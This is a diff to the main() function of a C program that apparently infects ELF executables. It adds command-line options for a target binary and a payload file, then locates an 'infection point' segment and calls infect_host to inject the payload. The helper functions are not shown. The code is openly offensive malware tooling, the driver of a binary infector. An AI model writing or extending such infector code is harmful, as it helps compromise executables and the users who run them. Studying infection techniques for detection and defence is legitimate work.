@@ -4,19 +4,45 @@
 
 int main(int argc,char **argv)
 {
-	open_map_file(argv[1]);
+    int opt;
+    unsigned char *target_elf = NULL;
+    unsigned char *payload = NULL;
 
-	extract_payload("payload.bin");
 
-	int segment = find_phdr();
-	if(segment<0)
-	{
-		printf("unable to find usable infection point\n");
-		exit(EXIT_FAILURE);
-	}
-	
-	infect_host(segment);	
-	
+    while ((opt = getopt(argc, argv, "f:p:")) != -1) {
+        switch (opt) {
+            case 'f':
+                target_elf = optarg;
+                break;
+            case 'p':
+                payload = optarg;
+                break;
+        }
+    }
 
-	return 0;
+    if(target_elf == NULL)
+    {
+        printf("Usage:%s -f Target ELF [-p] payload\n", argv[0]);
+        return 1;
+    }
+
+    open_map_file(target_elf);
+
+    if(payload == NULL){
+        extract_payload("payload.bin");
+    }else{
+        extract_payload(payload);
+    }
+
+    int segment = find_phdr();
+    if(segment<0)
+    {
+        printf("unable to find usable infection point\n");
+        exit(EXIT_FAILURE);
+    }
+
+    infect_host(segment);
+
+
+    return 0;
 }
